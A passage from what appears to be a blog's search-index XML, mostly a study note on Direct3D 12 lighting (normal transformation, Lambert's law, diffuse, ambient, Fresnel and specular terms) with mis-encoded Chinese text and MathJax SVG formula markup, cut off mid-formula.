      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>DX12 ç¬¬å…«ç« å­¦ä¹ </title>
    <url>/2022/03/17/d3d12-8/</url>
    <content><![CDATA[<h1 id="DX12-8th"><a href="#DX12-8th" class="headerlink" title="DX12-8th"></a>DX12-8th</h1><p>ç®—æ˜¯å¤ä¹ ä¸€ç‚¹ games101 çš„ä¸œè¥¿äº†ã€‚</p>
<h2 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h2><p>å˜æ¢æ³•å‘é‡ï¼Œè¯æ˜è¿‡ç¨‹ä½¿ç”¨ un<sup>T</sup> &#x3D; uÂ·n è›®æœ‰æ„æ€</p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="26.198ex" height="2.583ex" role="img" focusable="false" viewBox="0 -891.7 11579.5 1141.7" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path><path id="MJX-1-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path><path id="MJX-1-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path id="MJX-1-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path><path id="MJX-1-TEX-N-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path><path id="MJX-1-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path id="MJX-1-TEX-I-1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><use data-c="1D462" xlink:href="#MJX-1-TEX-I-1D462"></use></g><g data-mml-node="mo" transform="translate(794.2,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(1294.4,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(2172.2,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(3228,0)"><use data-c="1D462" xlink:href="#MJX-1-TEX-I-1D462"></use></g><g data-mml-node="mi" transform="translate(3800,0)"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="mo" transform="translate(4772.2,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(5272.4,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(5872.4,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mo" transform="translate(6261.4,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(6650.4,0)"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="msup" transform="translate(7400.4,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><use data-c="2212" xlink:href="#MJX-1-TEX-N-2212"></use></g><g data-mml-node="mn" transform="translate(778,0)"><use data-c="31" xlink:href="#MJX-1-TEX-N-31"></use></g></g></g><g data-mml-node="msup" transform="translate(8776.1,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D447" xlink:href="#MJX-1-TEX-I-1D447"></use></g></g></g><g data-mml-node="mo" transform="translate(10023.7,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="mn" transform="translate(11079.5,0)"><use data-c="30" xlink:href="#MJX-1-TEX-N-30"></use></g></g></g></svg></mjx-container>


<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>æœ—ä¼¯ä½™å¼¦å®šç†ï¼Œè¾å°„é€šé‡ï¼ˆradiant fluxï¼‰ï¼Œè¾ç…§åº¦ï¼ˆirradianceï¼‰ã€‚</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>æ¼«åå°„ï¼ˆdiffuseï¼‰</p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="28.325ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 12519.5 1000" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path><path id="MJX-1-TEX-I-1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-1-TEX-I-1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path><path id="MJX-1-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path id="MJX-1-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path><path id="MJX-1-TEX-N-22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path><path id="MJX-1-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path id="MJX-1-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path><path id="MJX-1-TEX-I-1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path><path id="MJX-1-TEX-N-2297" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM582 471Q531 510 496 523Q446 542 381 542Q324 542 272 519T196 471L389 278L485 375L582 471ZM167 442Q95 362 95 250Q95 137 167 58L359 250L167 442ZM610 58Q682 138 682 250Q682 363 610 442L418 250L610 58ZM196 29Q209 16 230 2T295 -27T388 -42Q409 -42 429 -40T465 -33T496 -23T522 -11T544 1T561 13T574 22T582 29L388 222L196 29Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(1161.5,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(2217.3,0)"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mi" transform="translate(3095.3,0)"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g><g data-mml-node="mi" transform="translate(3624.3,0)"><use data-c="1D465" xlink:href="#MJX-1-TEX-I-1D465"></use></g><g data-mml-node="mo" transform="translate(4196.3,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(4585.3,0)"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(5488.5,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(5988.7,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(6588.7,0)"><use data-c="2C" xlink:href="#MJX-1-TEX-N-2C"></use></g><g data-mml-node="mn" transform="translate(7033.4,0)"><use data-c="30" xlink:href="#MJX-1-TEX-N-30"></use></g><g data-mml-node="mo" transform="translate(7533.4,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mo" transform="translate(8144.6,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="msub" transform="translate(8644.8,0)"><g data-mml-node="mi"><use data-c="1D435" xlink:href="#MJX-1-TEX-I-1D435"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(10190.6,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="msub" transform="translate(11190.8,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g></g></g></svg></mjx-container>


<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>ç¯å¢ƒå…‰ï¼ˆambientï¼‰ï¼Œç”¨äºç®€å•æ¨¡æ‹Ÿå…¶ä»–ç‰©ä½“åå°„è¿‡æ¥çš„é—´æ¥å…‰ç…§</p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.355ex" xmlns="http://www.w3.org/2000/svg" width="13.777ex" height="1.975ex" role="img" focusable="false" viewBox="0 -716 6089.3 873.1" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path><path id="MJX-1-TEX-I-1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path><path id="MJX-1-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path><path id="MJX-1-TEX-N-2297" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM582 471Q531 510 496 523Q446 542 381 542Q324 542 272 519T196 471L389 278L485 375L582 471ZM167 442Q95 362 95 250Q95 137 167 58L359 250L167 442ZM610 58Q682 138 682 250Q682 363 610 442L418 250L610 58ZM196 29Q209 16 230 2T295 -27T388 -42Q409 -42 429 -40T465 -33T496 -23T522 -11T544 1T561 13T574 22T582 29L388 222L196 29Z"></path><path id="MJX-1-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D450" xlink:href="#MJX-1-TEX-I-1D450"></use></g><g data-mml-node="TeXAtom" transform="translate(466,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g></g></g><g data-mml-node="mo" transform="translate(1167.8,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="msub" transform="translate(2223.6,0)"><g data-mml-node="mi"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="TeXAtom" transform="translate(783,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(3760.4,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="msub" transform="translate(4760.6,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g></g></g></svg></mjx-container>


<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>Fresnel equationsï¼ˆè²æ¶…å°”ç­‰å¼ï¼‰ï¼ŒSchlick approximation</p>
<p>ç²—ç³™åº¦ï¼ˆroughnessï¼‰ï¼Œé•œé¢ç“£ï¼ˆspecular lobeï¼‰<br>é•œé¢åå°„å…‰ï¼ˆspecular ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220316170926311.png" alt="image-20220316170926311"></p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.602ex" xmlns="http://www.w3.org/2000/svg" width="49.447ex" height="4.638ex" role="img" focusable="false" viewBox="0 -1342 21855.4 2050" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path><path id="MJX-1-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 